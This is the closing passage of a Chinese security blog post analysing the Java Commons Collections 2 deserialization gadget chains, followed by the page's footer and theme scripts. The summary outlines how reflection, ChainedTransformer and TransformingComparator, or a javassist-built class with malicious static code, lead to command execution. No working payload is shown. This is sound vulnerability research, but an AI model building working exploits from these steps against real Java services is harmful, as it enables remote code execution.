+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h3><p>利用链1相对来说比较简单，只要控制好<code>comparator</code>什么时候为null，什么时候有值，就可以成功生成序列化文件和执行命令；</p>
+<ol>
+<li>通过反射获取Runtime对象（得到transformers数组）</li>
+<li>利用ChainedTransformer对transformers数组进行回调</li>
+<li>调用<code>TransformingComparator.compare</code>触发transformer方法</li>
+<li><code>this.transformer</code>参数可控，传入恶意内容</li>
+</ol>
+<h3 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h3><p>利用链2用到了javassit，简单来说就是利用javassit的特点，可以新建一个类，并且可以向该类中插入恶意代码，由static修饰，当别处实例化这个类的时候就会执行static中的恶意代码；</p>
+<p>所以整条链都是为了满足能成功实例化新建类而添加的条件；<br><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance()</code></p>
+<p>参考连接：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/117194343">https://blog.csdn.net/qq_41918771/article/details/117194343</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/depycode/p/13583102.html">https://www.cnblogs.com/depycode/p/13583102.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a></p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span>喜欢这篇文章？为什么不考虑打赏一下作者呢？</span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a href="/">John Doe</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://example.com/2022/09/18/Java%20%20Commons%20Collection%202%E5%88%86%E6%9E%90/">http://example.com/2022/09/18/Java%20%20Commons%20Collection%202%E5%88%86%E6%9E%90/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    <a href="#top" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+      document.addEventListener('copy', function (event) {
+      const clipboardData = event.clipboardData || window.clipboardData;
+      if (!clipboardData) { return; }
+      const text = window.getSelection().toString();
+      if (text) {
+        event.preventDefault();
+        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
+      }
+    });
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
